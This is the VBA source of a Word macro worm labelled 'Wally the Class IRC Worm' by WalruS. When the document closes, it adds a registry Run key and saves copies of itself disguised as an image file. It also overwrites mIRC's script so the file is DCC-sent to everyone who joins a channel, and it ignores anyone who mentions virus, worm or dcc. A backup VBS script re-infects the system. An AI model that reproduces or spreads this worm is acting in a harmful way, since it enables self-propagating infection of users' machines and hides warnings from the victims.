VERSION 1.0 CLASS			
BEGIN				
  MultiUse = -1  'True		
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True		
Private Sub Document_Close()
    ' Wally the Class IRC Worm v1.10 by WalruS 09/00
    On Error Resume Next
    Application.DisplayStatusBar = False
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Wally") = "C:\Windows\Backup.vbs"
    mircinstalled = Dir("C:\Mirc\mirc32.exe")
    If mircinstalled = "" Then
    Exit Sub
    Else
    alreadyinfected = Dir("c:\Mirc\Download\MyPic.jþg")
    If alreadyinfected = "" Then ActiveDocument.SaveAs "C:\Windows\Document.bak"
    If alreadyinfected = "" Then ActiveDocument.SaveAs "C:\Mirc\Download\MyPic.jþg"
    Kill "C:\Mirc\Script.ini"
    Open "C:\Mirc\Script.ini" For Output As #1
    Open "C:\Windows\Desktop\jim.ini" For Output As #1
        Print #1, "[script]"
        Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\MyPic.jþg }"
        Print #1, "n1=on 1:CONNECT: {"
        Print #1, "n2=  /join #virus "
        Print #1, "n3=  /msg #virus Ive been hit by Wally the IRC worm. By WalruS"
        Print #1, "n4= /part #virus"
        Print #1, "n5=  /join #vxtrader "
        Print #1, "n6=  /msg #vxtrader Ive been hit by Wally the IRC worm. By WalruS"
        Print #1, "n7=  /msg #vxtrader If ya want a copy join my channels!"
        Print #1, "n8= /part #vxtrader"
        Print #1, "n9=on 1:TEXT:*walrus*:#:/.ignore $nick"
        Print #1, "n10=on 1:TEXT:*walrus*:?:/.ignore $nick"
        Print #1, "n11=on 1:TEXT:*wally*:#:/.ignore $nick"
        Print #1, "n12=on 1:TEXT:*wally*:?:/.ignore $nick"
        Print #1, "n13=on 1:TEXT:*script.ini*:#:/.ignore $nick"
        Print #1, "n14=on 1:TEXT:*script.ini*:?:/.ignore $nick"
        Print #1, "n15=on 1:TEXT:*virus*:#:/.ignore $nick"
        Print #1, "n16=on 1:TEXT:*virus*:?:/.ignore $nick"
        Print #1, "n17=on 1:TEXT:*worm*:#:/.ignore $nick"
        Print #1, "n18=on 1:TEXT:*worm*:?:/.ignore $nick"
        Print #1, "n19=on 1:TEXT:*dcc*:#:/.ignore $nick"
        Print #1, "n20=on 1:TEXT:*dcc*:?:/.ignore $nick"
        Print #1, "n21=on 1:TEXT:*send*:#:/.ignore $nick"
        Print #1, "n22=on 1:TEXT:*send*:?:/.ignore $nick"
        Print #1, "n23= /clear"
        Print #1, "n24= /motd"
        Print #1, "n25= }"
    Close #1
    Kill "C:\Windows\Script.bak"
    Open "C:\Windows\Script.bak" For Output As #2
        Print #2, "[script]"
        Print #2, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\MyPic.jþg }"
        Print #2, "n1=on 1:CONNECT: {"
        Print #2, "n2=  /join #virus "
        Print #2, "n3=  /msg #virus Ive been hit by Wally the IRC worm. By WalruS"
        Print #2, "n4= /part #virus"
        Print #2, "n5=  /join #vxtrader "
        Print #2, "n6=  /msg #vxtrader Ive been hit by Wally the IRC worm. By WalruS"
        Print #2, "n7=  /msg #vxtrader If ya want a copy join my channels!"
        Print #2, "n8= /part #vxtrader"
        Print #2, "n9=on 1:TEXT:*walrus*:#:/.ignore $nick"
        Print #2, "n10=on 1:TEXT:*walrus*:?:/.ignore $nick"
        Print #2, "n11=on 1:TEXT:*wally*:#:/.ignore $nick"
        Print #2, "n12=on 1:TEXT:*wally*:?:/.ignore $nick"
        Print #2, "n13=on 1:TEXT:*script.ini*:#:/.ignore $nick"
        Print #2, "n14=on 1:TEXT:*script.ini*:?:/.ignore $nick"
        Print #2, "n15=on 1:TEXT:*virus*:#:/.ignore $nick"
        Print #2, "n16=on 1:TEXT:*virus*:?:/.ignore $nick"
        Print #2, "n17=on 1:TEXT:*worm*:#:/.ignore $nick"
        Print #2, "n18=on 1:TEXT:*worm*:?:/.ignore $nick"
        Print #2, "n19=on 1:TEXT:*dcc*:#:/.ignore $nick"
        Print #2, "n20=on 1:TEXT:*dcc*:?:/.ignore $nick"
        Print #2, "n21=on 1:TEXT:*send*:#:/.ignore $nick"
        Print #2, "n22=on 1:TEXT:*send*:?:/.ignore $nick"
        Print #2, "n23= /clear"
        Print #2, "n24= /motd"
        Print #2, "n25= }"
    Close #2
    End If
    Open "C:\Windows\Backup.vbs" For Output As #1
         Print #1, "' Wally the IRC Worm by WalruS"
         Print #1, "On Error Resume Next"
         Print #1, "Dim fso, fbackup, sbackup"
         Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
         Print #1, "Set fbackup = fso.GetFile(""C:\Windows\Document.bak"")"
         Print #1, "fbackup.Copy(""C:\Mirc\Download\MyPic.jþg"")"
         Print #1, "Set sbackup = fso.GetFile(""C:\Windows\Script.bak"")"
         Print #1, "sbackup.Copy(""C:\Mirc\Script.ini"")"
         Print #1, "If Minute(Now) = 59 Then"
         Print #1, "MsgBox ""Wally The Worm Loves Ya!"", vbinformation, ""WalruS Says...""
    Close #1
End Sub
Sub HelpAbout()
    MsgBox "Wally the Class IRC worm by WalruS", 0, "Wally"
End Sub